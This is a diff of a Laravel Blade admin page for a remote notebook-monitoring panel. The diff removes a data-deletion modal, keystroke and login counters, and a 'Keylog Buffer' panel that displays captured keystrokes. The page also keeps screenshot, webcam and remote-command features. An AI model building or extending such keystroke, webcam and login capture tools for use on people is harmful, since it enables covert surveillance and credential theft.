@@ -17,11 +17,6 @@
                     </span>
                 </div>
                 <div class="d-flex gap-2">
-                    <!-- Botão Limpar Dados -->
-                    <button type="button" class="btn btn-outline-danger" data-bs-toggle="modal" data-bs-target="#limparDadosModal">
-                        <i class="fas fa-trash me-1"></i>Limpar Dados
-                    </button>
-                    
                     <!-- Botão Capturar Tela -->
                     <form action="{{ route('admin.notebooks.comando', $notebook->id) }}" method="POST" class="d-inline">
                         @csrf
@@ -45,77 +40,6 @@
                     </a>
                 </div>
             </div>
-
-            <!-- Modal para Limpar Dados -->
-            <div class="modal fade" id="limparDadosModal" tabindex="-1">
-                <div class="modal-dialog">
-                    <div class="modal-content">
-                        <div class="modal-header">
-                            <h5 class="modal-title">Limpar Dados Coletados</h5>
-                            <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
-                        </div>
-                        <div class="modal-body">
-                            <p>Selecione quais dados deseja limpar:</p>
-                            
-                            <form id="limparDadosForm" action="{{ route('admin.notebooks.limpar-dados', $notebook->id) }}" method="POST">
-                                @csrf
-                                @method('DELETE')
-                                
-                                <div class="mb-3">
-                                    <div class="form-check">
-                                        <input class="form-check-input" type="checkbox" name="dados[]" value="screenshot" id="limparScreenshot">
-                                        <label class="form-check-label" for="limparScreenshot">
-                                            <i class="fas fa-camera text-danger me-1"></i> Screenshots
-                                        </label>
-                                    </div>
-                                    <div class="form-check">
-                                        <input class="form-check-input" type="checkbox" name="dados[]" value="webcam" id="limparWebcam">
-                                        <label class="form-check-label" for="limparWebcam">
-                                            <i class="fas fa-user text-info me-1"></i> Imagens da Webcam
-                                        </label>
-                                    </div>
-                                    <div class="form-check">
-                                        <input class="form-check-input" type="checkbox" name="dados[]" value="keylog" id="limparKeylog">
-                                        <label class="form-check-label" for="limparKeylog">
-                                            <i class="fas fa-keyboard text-warning me-1"></i> Histórico de Teclas
-                                        </label>
-                                    </div>
-                                    <div class="form-check">
-                                        <input class="form-check-input" type="checkbox" name="dados[]" value="cliques" id="limparCliques">
-                                        <label class="form-check-label" for="limparCliques">
-                                            <i class="fas fa-mouse-pointer text-success me-1"></i> Histórico de Cliques
-                                        </label>
-                                    </div>
-                                    <div class="form-check">
-                                        <input class="form-check-input" type="checkbox" name="dados[]" value="logins" id="limparLogins">
-                                        <label class="form-check-label" for="limparLogins">
-                                            <i class="fas fa-sign-in-alt text-primary me-1"></i> Logins Detectados
-                                        </label>
-                                    </div>
-                                    <div class="form-check">
-                                        <input class="form-check-input" type="checkbox" name="dados[]" value="todos" id="limparTodos">
-                                        <label class="form-check-label fw-bold" for="limparTodos">
-                                            <i class="fas fa-broom text-danger me-1"></i> LIMPAR TUDO
-                                        </label>
-                                    </div>
-                                </div>
-                                
-                                <div class="alert alert-warning">
-                                    <i class="fas fa-exclamation-triangle me-2"></i>
-                                    <strong>Atenção:</strong> Esta ação não pode ser desfeita. Os dados selecionados serão permanentemente removidos.
-                                </div>
-                            </form>
-                        </div>
-                        <div class="modal-footer">
-                            <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancelar</button>
-                            <button type="button" class="btn btn-danger" onclick="confirmarLimpeza()">
-                                <i class="fas fa-trash me-1"></i>Limpar Dados Selecionados
-                            </button>
-                        </div>
-                    </div>
-                </div>
-            </div>
-
             <!-- Cards de Status Rápidos -->
             <div class="row mb-4">
                 <div class="col-xl-2 col-md-4">
@@ -183,24 +107,6 @@
                         </div>
                     </div>
                 </div>
-                
-                <div class="col-xl-2 col-md-4">
-                    <div class="card bg-warning text-dark">
-                        <div class="card-body">
-                            <div class="d-flex justify-content-between">
-                                <div>
-                                    <h6 class="card-title text-dark-50">TECLAS</h6>
-                                    <h6 class="mb-0">
-                                        {{ $notebook->historico_teclas && is_array($notebook->historico_teclas) ? count($notebook->historico_teclas) : 0 }}
-                                    </h6>
-                                </div>
-                                <div class="align-self-center">
-                                    <i class="fas fa-keyboard fa-2x"></i>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
 
                 <div class="col-xl-2 col-md-4">
                     <div class="card bg-danger text-white">
@@ -220,18 +126,22 @@
                     </div>
                 </div>
 
-                <div class="col-xl-2 col-md-4">
+                <div class="col-xl-4 col-md-8">
                     <div class="card bg-secondary text-white">
                         <div class="card-body">
                             <div class="d-flex justify-content-between">
                                 <div>
-                                    <h6 class="card-title text-white-50">LOGINS</h6>
+                                    <h6 class="card-title text-white-50">STATUS DO SISTEMA</h6>
                                     <h6 class="mb-0">
-                                        {{ $notebook->historico_logins && is_array($notebook->historico_logins) ? count($notebook->historico_logins) : 0 }}
+                                        @if($notebook->estaOnline)
+                                            🟢 Monitoramento Ativo
+                                        @else
+                                            🔴 Sem Conexão
+                                        @endif
                                     </h6>
                                 </div>
                                 <div class="align-self-center">
-                                    <i class="fas fa-sign-in-alt fa-2x"></i>
+                                    <i class="fas fa-desktop fa-2x"></i>
                                 </div>
                             </div>
                         </div>
@@ -490,26 +400,6 @@
                         </div>
                     </div>
 
-                    <!-- Keylog Buffer -->
-                    @if($notebook->keylog_buffer)
-                    <div class="card mb-4">
-                        <div class="card-header bg-warning text-dark d-flex justify-content-between align-items-center">
-                            <h5 class="mb-0">
-                                <i class="fas fa-keyboard me-2"></i>Keylog Buffer
-                                <span class="badge bg-dark">{{ strlen($notebook->keylog_buffer) }} chars</span>
-                            </h5>
-                            <button class="btn btn-sm btn-outline-danger" onclick="limparDadosEspecificos('keylog')">
-                                <i class="fas fa-trash"></i>
-                            </button>
-                        </div>
-                        <div class="card-body">
-                            <div class="keylog-container" style="max-height: 200px; overflow-y: auto;">
-                                <pre class="mb-0 p-3 border rounded small">{{ $notebook->keylog_buffer }}</pre>
-                            </div>
-                        </div>
-                    </div>
-                    @endif
-
                     <!-- Aplicativo Atual -->
                     @if($notebook->info_sistema && isset($notebook->info_sistema['aplicativo_atual']))
                     <div class="card mb-4">
@@ -580,119 +470,6 @@
 @endsection
 
 @section('scripts')
-<script>
-// Auto-refresh a cada 30 segundos
-setInterval(function() {
-    location.reload();
-}, 30000);
-
-// Função para confirmar limpeza de dados
-function confirmarLimpeza() {
-    const form = document.getElementById('limparDadosForm');
-    const checkboxes = form.querySelectorAll('input[type="checkbox"]:checked');
-    
-    if (checkboxes.length === 0) {
-        alert('Selecione pelo menos um tipo de dado para limpar.');
-        return;
-    }
-    
-    if (confirm('Tem certeza que deseja limpar os dados selecionados? Esta ação não pode ser desfeita.')) {
-        // Mostrar loading
-        const btn = event.target;
-        const originalText = btn.innerHTML;
-        btn.innerHTML = '<i class="fas fa-spinner fa-spin me-1"></i>Limpando...';
-        btn.disabled = true;
-        
-        form.submit();
-    }
-}
-
-// Função para limpar dados específicos
-function limparDadosEspecificos(tipo) {
-    if (confirm(`Deseja limpar todos os dados de ${tipo}?`)) {
-        const form = document.createElement('form');
-        form.method = 'POST';
-        form.action = '{{ route("admin.notebooks.limpar-dados", $notebook->id) }}';
-        
-        const csrf = document.createElement('input');
-        csrf.type = 'hidden';
-        csrf.name = '_token';
-        csrf.value = '{{ csrf_token() }}';
-        
-        const method = document.createElement('input');
-        method.type = 'hidden';
-        method.name = '_method';
-        method.value = 'DELETE';
-        
-        const dados = document.createElement('input');
-        dados.type = 'hidden';
-        dados.name = 'dados[]';
-        dados.value = tipo;
-        
-        form.appendChild(csrf);
-        form.appendChild(method);
-        form.appendChild(dados);
-        
-        document.body.appendChild(form);
-        form.submit();
-    }
-}
-
-// Inicialização quando o documento estiver pronto
-document.addEventListener('DOMContentLoaded', function() {
-    // Tooltips
-    var tooltipTriggerList = [].slice.call(document.querySelectorAll('[data-bs-toggle="tooltip"]'))
-    var tooltipList = tooltipTriggerList.map(function (tooltipTriggerEl) {
-        return new bootstrap.Tooltip(tooltipTriggerEl)
-    });
-
-    // Alternar entre abas e salvar preferência
-    const activeTab = localStorage.getItem('activeNotebookTab');
-    if (activeTab) {
-        const tab = document.querySelector(`#${activeTab}-tab`);
-        if (tab) {
-            new bootstrap.Tab(tab).show();
-        }
-    }
-    
-    document.querySelectorAll('#historicoTabs .nav-link').forEach(tab => {
-        tab.addEventListener('shown.bs.tab', function (e) {
-            localStorage.setItem('activeNotebookTab', e.target.id.replace('-tab', ''));
-        });
-    });
-
-    // Feedback visual para envio de comandos
-    document.querySelectorAll('form[action*="comando"]').forEach(form => {
-        form.addEventListener('submit', function(e) {
-            const btn = this.querySelector('button[type="submit"]');
-            const originalText = btn.innerHTML;
-            
-            btn.innerHTML = '<i class="fas fa-spinner fa-spin me-1"></i>Enviando...';
-            btn.disabled = true;
-            
-            setTimeout(() => {
-                btn.innerHTML = originalText;
-                btn.disabled = false;
-            }, 3000);
-        });
-    });
-
-    // Quando selecionar "Limpar Tudo", marcar todos os checkboxes
-    const limparTodosCheckbox = document.getElementById('limparTodos');
-    if (limparTodosCheckbox) {
-        limparTodosCheckbox.addEventListener('change', function() {
-            const checkboxes = document.querySelectorAll('#limparDadosForm input[type="checkbox"]');
-            checkboxes.forEach(checkbox => {
-                if (checkbox.id !== 'limparTodos') {
-                    checkbox.checked = this.checked;
-                }
-            });
-        });
-    }
-});
-</script>
-
-
 <style>
 .card {
     box-shadow: 0 0.125rem 0.25rem rgba(0, 0, 0, 0.075);
@@ -724,12 +501,6 @@ document.addEventListener('DOMContentLoaded', function() {
 .nav-tabs .nav-link.active {
     border-bottom: 3px solid #0d6efd;
     background: transparent;
-}
-
-.keylog-container pre {
-    font-family: 'Courier New', monospace;
-    font-size: 0.8rem;
-    line-height: 1.4;
 }
 
 .table-hover tbody tr:hover {
